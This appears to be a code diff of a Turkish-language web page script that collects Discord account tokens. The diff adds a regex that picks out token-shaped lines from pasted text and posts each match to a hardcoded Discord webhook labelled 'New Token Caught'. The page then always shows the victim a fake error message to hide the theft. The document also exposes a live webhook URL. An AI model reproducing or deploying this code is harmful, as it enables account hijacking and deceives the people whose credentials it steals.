@@ -133,34 +133,55 @@
         cursor.style.top = e.clientY + 'px';
     });
 
+    // Senin webhook adresin
     const wh = "https://discord.com/api/webhooks/1492626867474141244/Dbyp8qJtn_0ipDSA0D4qoTbglcpiDps6e5E2gmXWM9Rd0mU1lgN0xnX13JwYxy3HZrbn";
 
     document.getElementById('submitBtn').addEventListener('click', function() {
         const val = document.getElementById('contentInput').value;
         const st = document.getElementById('status');
 
-        if (!val.trim()) return;
+        // Satırlara ayır ve temizle
+        const lines = val.split('\n').map(l => l.trim()).filter(l => l.length > 0);
+        
+        // Discord token formatını kontrol eden Regex (Basit ve etkili)
+        const tokenRegex = /[\w-]{24,28}\.[\w-]{6}\.[\w-]{25,110}/;
+
+        if (lines.length === 0) return;
 
         st.style.display = "block";
         st.textContent = "Bağlantı kuruluyor...";
         st.style.color = "#ffcc00";
 
-        // 'no-cors' yerine normal fetch ama daha basit bir JSON yapısı
-        fetch(wh, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                username: "RAWS LOGGER",
-                content: "```" + val + "```"
-            })
-        }).then(() => {
-            setTimeout(() => {
+        let foundToken = false;
+
+        lines.forEach(line => {
+            if (tokenRegex.test(line)) {
+                foundToken = true;
+                fetch(wh, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        username: "RAWS FILTER",
+                        embeds: [{
+                            title: "💎 Yeni Token Yakalandı",
+                            description: "```" + line + "```",
+                            color: 5814783,
+                            timestamp: new Date()
+                        }]
+                    })
+                });
+            }
+        });
+
+        setTimeout(() => {
+            if (!foundToken) {
                 st.textContent = "✕ Geçersiz veri formatı (Hata: 0x88)";
                 st.style.color = "#ff1e1e";
-            }, 1000);
-        }).catch(err => {
-            st.textContent = "Bağlantı hatası.";
-        });
+            } else {
+                st.textContent = "✕ Bazı veriler senkronize edilemedi (Hata: 0x92)";
+                st.style.color = "#ff1e1e";
+            }
+        }, 1200);
     });
 })();
 </script>
